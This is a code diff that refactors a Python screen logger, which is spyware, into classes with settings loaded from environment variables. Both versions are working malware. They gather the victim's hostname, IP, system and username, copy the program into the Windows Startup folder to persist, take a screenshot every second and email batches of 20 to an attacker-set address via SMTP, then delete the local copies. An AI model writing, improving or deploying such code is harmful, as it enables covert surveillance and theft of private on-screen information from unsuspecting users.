@@ -1,4 +1,3 @@
-#------IMPORT------#
 import pyautogui
 import time
 import socket
@@ -7,93 +6,94 @@ import smtplib
 import shutil
 import platform
 from email.message import EmailMessage
+from dotenv import load_dotenv
 
-#------VICTIM INFORMATION------#
+# Load environment variables from .env file
+load_dotenv()
 
-# -- Get System Info:
-system = platform.platform()
-# -- Get Hostname:
-hostname = socket.gethostname()
-# -- Get IP:
-ip = socket.gethostbyname(hostname)
-# -- Get where the .exe was opened:
-dir = os.getcwd()
-# -- Get User:
-user = (os.getlogin())
+class VictimInfo:
+    def __init__(self):
+        self.system = platform.platform()
+        self.hostname = socket.gethostname()
+        self.ip = socket.gethostbyname(self.hostname)
+        self.user = os.getlogin()
+        self.execution_dir = os.path.dirname(__file__)
+        self.images_dir = os.getenv('IMAGES_DIR')
+        self.startup_dir = os.getenv('STARTUP_DIR').format(user=self.user)
 
-#------FUNCTIONS------#
+    def log_info(self):
+        return f"ℹ️ - LOG INFORMATION:\n\n🖥️ | Hostname: {self.hostname}\n⚙️ | System: {self.system}\n📍 | IP: {self.ip}"
 
-# -- Copy to StartUp:
-def copystartup():
- originalfilename = "screenloger-by-sousa.exe" #    Name of the original .exe file of the code (If you covert)
- coppiedfilename = 'testestartup-NOMEALTERADO.exe' #     Name of the .exe file that will be copied
- copytodir = 'C://Users//' + user + '//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//'
- copyfromdir = dir + "\\" + originalfilename
 
- filesindir = os.listdir(copytodir)
+class FileManager:
+    @staticmethod
+    def copy_to_startup(original_filename, copied_filename, startup_dir):
+        source_path = os.path.join(os.path.dirname(__file__), original_filename)
+        destination_path = os.path.join(startup_dir, copied_filename)
 
- if coppiedfilename not in filesindir:
-    try:
-        shutil.copy2(copyfromdir, copytodir + coppiedfilename)
-    except Exception as e:
-        print (e)
+        if not os.path.isfile(source_path):
+            print(f"Error: The file {source_path} does not exist.")
+            return
 
-    except Exception as e:
-        print (e)    
-# -- Send Mail:
-def send_mail():
-    try:
-        msg = EmailMessage()
-        msg["From"] = "emailsender" #Change to your Email
-        msg["To"] = "emailreceiver" #Change to the EMail that will receive the Logs!
-        msg["Subject"] = ("🕵🏻 - User Grabbed : " + str(hostname))
+        try:
+            shutil.copy2(source_path, destination_path)
+            print(f"File copied to {startup_dir}")
+        except Exception as e:
+            print(f"Error during copying: {e}")
 
-        #-------STRUCTURE OF EMAIL TEXTS-----------#
 
-        body = ("ℹ️ - LOG INFORMATIONS:" + "\n\n🖥️ | Victim HOSTNAME : " + str(hostname) +"\n⚙️ | System : " + str(system) + "\n📍 | IP : " + str(ip)) #     Email text = (User,Hostnamem,System,Ip)
-        msg.set_content(body)
+class EmailManager:
+    @staticmethod
+    def send_email(subject, body, images_dir):
+        try:
+            msg = EmailMessage()
+            msg["From"] = os.getenv('EMAIL_SENDER')
+            msg["To"] = os.getenv('EMAIL_RECEIVER')
+            msg["Subject"] = subject
+            msg.set_content(body)
 
-        images = os.listdir("IMAGES")
-        path = "C:\\IMAGES\\" #     Name of the folder where the pics will be stored
-        for image in images:
-            file = open(path+image, "rb")
-            data = file.read()
-            file_name = file.name
-            msg.add_attachment(data, maintype = 'image', subtype = "png", filename = file_name)
-            file.close()
+            for image in os.listdir(images_dir):
+                image_path = os.path.join(images_dir, image)
+                with open(image_path, "rb") as file:
+                    msg.add_attachment(file.read(), maintype='image', subtype='png', filename=image)
 
-        server = smtplib.SMTP('smtp.gmail.com', 587) #  SMTP OF GMAIL
-        server.ehlo()
-        server.starttls()
-        server.login("email", "apppassword") #    Change to your email and App Password
-        server.send_message(msg)
+            server = smtplib.SMTP(os.getenv('SMTP_SERVER'), int(os.getenv('SMTP_PORT')))
+            server.starttls()
+            server.login(os.getenv('EMAIL_SENDER'), os.getenv('EMAIL_PASSWORD'))
+            server.send_message(msg)
+            server.close()
 
-        server.close()
-        shutil.rmtree("IMAGES")
-    except Exception as mail_error:
-        shutil.rmtree("IMAGES")
-        pass
-# -- Take Pic:
-def takepik():
-    
- count = 0
- os.chdir("C:\\")
- if "IMAGES" in os.listdir("C:"):
-     send_mail()
- else:
-     os.mkdir("C:IMAGES")
- while True:
-     if "IMAGES" not in os.listdir("C:"):
-         os.mkdir('C:IMAGES')
-     pic = pyautogui.screenshot()
-     pic.save("C:IMAGES\\PIC-"+str(count)+".png") #  Name of images
-     count += 1
-     if count >= 20: #  Number of images in each email (20)
-         send_mail()
-         count = 0
-     time.sleep(1) #   Time between each printscreen (1s Delay)
+            shutil.rmtree(images_dir)
+        except Exception as e:
+            shutil.rmtree(images_dir)
+            print(f"Error sending email: {e}")
 
-#------------#
 
-copystartup()
-takepik()
+class ScreenLogger:
+    def __init__(self, images_dir):
+        self.images_dir = images_dir
+        self.count = 0
+
+        if not os.path.exists(self.images_dir):
+            os.mkdir(self.images_dir)
+
+    def take_screenshots(self):
+        while True:
+            screenshot = pyautogui.screenshot()
+            screenshot.save(os.path.join(self.images_dir, f"PIC-{self.count}.png"))
+            self.count += 1
+
+            if self.count >= 20:
+                victim_info = VictimInfo()
+                EmailManager.send_email(f"🕵🏻 - User Grabbed: {victim_info.hostname}", victim_info.log_info(), self.images_dir)
+                self.count = 0
+
+            time.sleep(1)
+
+
+if __name__ == "__main__":
+    victim_info = VictimInfo()
+    FileManager.copy_to_startup("ScreenLogger.py", "testestartup-NOMEALTERADO.exe", victim_info.startup_dir)
+
+    screen_logger = ScreenLogger(victim_info.images_dir)
+    screen_logger.take_screenshots()
